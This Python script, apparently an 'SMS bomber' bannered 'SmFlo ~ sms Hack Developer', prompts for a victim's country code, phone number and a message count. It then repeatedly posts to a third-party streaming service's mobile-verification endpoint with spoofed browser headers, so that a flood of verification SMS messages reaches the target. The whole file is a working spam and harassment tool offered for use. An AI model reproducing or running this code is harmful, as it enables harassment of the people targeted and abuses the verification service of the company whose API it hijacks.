import os, sys, json, requests, time

class Bala:
	def __init__(self):
		self.u="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
		self.unum()

	def unum(self):
		kod=input("\033[1;37mEnter the country key without the + sign : \033[1;m")
		print('\033[1;31mExample : 0500000000\033[1;m')
		nom=input(f"\033[1;37mType the number : +{kod}\033[1;m")
		jum=int(input("\033[1;37mHow much do you want to send him a spam message ? : \033[1;m"))
		for i in range(jum):
			res=self.send(kod,nom)
			if '{"status":"ok"}' in res:
				print(f"\033[1;31m{i+1}. has been sent\033[1;m")
			else:
				print(f"{i+1}. Failed\n- Detail: {res}")
			time.sleep(1)

	def send(self,kod,nom):
		ata={"country_code":kod,"phone_number":nom}
		head={"Connection":"keep-alive",
			"Content-Length":f"{len(str(ata))}",
			"Accept":"application/json, text/plain, */*",
			"Origin":"https://lite.altbalaji.com",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
			"Content-Type":"application/json;charset=UTF-8",
			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
			"Accept-Encoding":"gzip, deflate, br",
			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6",
			}
		req=requests.post(self.u,data=json.dumps(ata),headers=head)
		return req.text

try:
	os.system('clear')
	print('''\033[1;37m
	# SmFlo #
	    ~ sms Hack Developer 0xfff0800
	    (Greetings to the 0x)
	\033[1;m''')
	Bala()

	while True:
		pil=input("\033[1;37mDo you want to continue (y/n)? \033[1;m")
		if pil.lower() == "y":
			print()
			Bala()
		else:
			sys.exit("\033[1;37mgoodbye for now\033[1;m")
except Exception as Err:
	print(f"Err: {Err}")
